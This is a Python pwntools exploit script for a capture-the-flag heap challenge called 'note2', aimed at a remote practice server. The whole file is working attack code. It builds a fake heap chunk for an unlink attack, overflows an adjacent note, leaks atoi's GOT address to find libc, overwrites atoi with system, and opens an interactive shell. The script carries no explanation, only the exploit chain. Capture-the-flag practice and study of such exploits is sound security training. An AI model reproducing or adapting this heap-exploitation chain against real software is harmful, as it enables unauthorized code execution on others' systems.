#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/05/26 11:07:39
@Author  :   eur1ka  
@Version :   2.7
@Contact :   raogx.vip@hotmail.com
@License :   (C)Copyright 2017-2018, Liugroup-NLPR-CASIA
@Desc    :   None
'''

# here put the import lib

from pwn import *
from LibcSearcher import *
import pwnlib
ptr = 0x602120
context.log_level = 'debug'
debug = 0
if debug:
    sh = process('note2')
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    sh = remote('node3.buuoj.cn',25612)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
elf = ELF('note2')

atoi_got = elf.got['atoi']

def cmd(choice):
    sh.recvuntil("option--->>\n")
    sh.sendline(str(choice))

def add(size,content):
    cmd(1)
    sh.recvuntil("Input the length of the note content:(less than 128)\n")
    sh.sendline(str(size))
    sh.recvuntil("Input the note content:\n")
    sh.sendline(content)

def show(index):
    cmd(2)
    sh.recvuntil("Input the id of the note:\n")
    sh.sendline(str(index))

def edit_1(index,content):
    cmd(3)
    sh.recvuntil("Input the id of the note:\n")
    sh.sendline(str(index))
    sh.recvuntil("do you want to overwrite or append?[1.overwrite/2.append]\n")
    sh.sendline("1")
    sh.recvuntil("TheNewContents:")
    sh.sendline(content)

def edit_2(index,content):
    cmd(3)
    sh.recvuntil("Input the id of the note:\n")
    sh.sendline(str(index))
    sh.recvuntil("do you want to overwrite or append?[1.overwrite/2.append]\n")
    sh.sendline("2")
    sh.recvuntil("TheNewContents:")
    sh.sendline(content)

def dele(index):
    cmd(4)
    sh.recvuntil("Input the id of the note:\n")
    sh.sendline(str(index))
sh.recvuntil("Input your name:\n")
sh.sendline("eur1ka")
sh.recvuntil("Input your address:\n")
sh.sendline("aaaa")
fake_chunk = p64(0) + p64(0x81+0x20)
fake_chunk += p64(ptr-0x18) + p64(ptr-0x10)
add(0x80,fake_chunk)
add(0,"")
add(0x80,'cccc')
add(0x10,"cccc")
edit_1(1,'d'*0x10 + 'd'*0x8 + p8(0x90))


for i in range(7,-1,-1):
	payload = 'd'*0x10 + 'd'*i
	edit_1(1,payload)
payload = 'd' * 0x10 + p64(0x20+0x80)
edit_1(1,payload)
dele(2)
payload = 'a' * 0x18 + p64(ptr+8)
edit_1(0,payload)
payload = p64(atoi_got)
edit_1(0,payload)
show(1)
sh.recvuntil("Content is ")
atoi_addr = u64(sh.recv(6).ljust(8,"\x00"))
log.info("Success leak atoi_addr:0x%x"%atoi_addr)
libc = LibcSearcher('atoi',atoi_addr)
libc_base = atoi_addr - libc.dump('atoi')
system_addr = libc_base + libc.dump('system')
edit_1(1,p64(system_addr))
sh.sendline("/bin/sh\x00")
sh.interactive()